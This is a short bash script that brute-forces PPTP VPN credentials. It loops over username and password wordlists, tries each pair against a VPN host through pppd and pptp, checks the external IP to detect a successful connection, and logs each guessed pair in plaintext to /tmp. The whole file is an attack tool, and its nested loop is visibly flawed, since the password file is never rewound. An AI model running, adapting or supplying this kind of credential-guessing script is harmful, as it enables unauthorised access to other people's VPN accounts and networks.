#!/bin/bash
source externalIp.sh

#getExternalIp

users=usernames.txt 
passwords=passwords.txt
vpnDomain="domainGoesHere"
vpnHostname="vpn.domain.co.uk"

exec 3<$users
exec 4<$passwords

if [ -f $users ]
then
while read -u 3 -r a
  do
        while read -u 4 -r b
                do
                echo  "$a : $b"
                echo $a > /tmp/userpass.txt
                echo $b >> /tmp/userpass.txt
                
                pppd pty "pptp $vpnHostname --nolaunchpppd" file /etc/ppp/options.pptp  user $a domain $vpnDomain password $b
                sleep 10
                getExternalIp                
#grep ifconffig or ps or top
                killall pppd
        done

done

fi
